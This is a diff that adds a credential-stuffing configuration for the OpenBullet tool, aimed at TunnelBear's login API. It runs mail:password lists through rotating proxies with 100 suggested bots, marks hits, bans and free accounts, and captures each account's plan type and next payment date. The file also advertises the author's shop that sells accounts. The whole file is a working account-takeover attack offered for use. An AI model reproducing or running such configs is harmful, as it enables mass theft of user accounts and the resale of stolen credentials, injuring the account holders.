@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "_TunnelBear_Faraday",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-19T15:31:37.021972+01:00",
+  "AdditionalInfo": "Captures plan and next due payment date | 3k cpm with public proxies | My account shop: https://shoppy.gg/@msfaraday",
+  "Author": "Ms. Faraday",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.tunnelbear.com/core/api/login" 
+  CONTENT "username=<USER>&password=<PASS>&withUserDetails=true&v=web-1.0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "bearType" 
+  KEYCHAIN Failure OR 
+    KEY "Access denied" 
+  KEYCHAIN Ban OR 
+    KEY "Rate limiting" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"paymentStatus\":\"FREE\"" 
+
+PARSE "<SOURCE>" LR "\"bearType\":\"" "\"" -> CAP "Plan type" 
+PARSE "<SOURCE>" LR "\"fullVersionUntil\":\"" "\"" -> CAP "Next payment" 
+FUNCTION Constant "htts://shoppy.gg/@msfaraday" -> CAP "Faraday's Account Shop" 
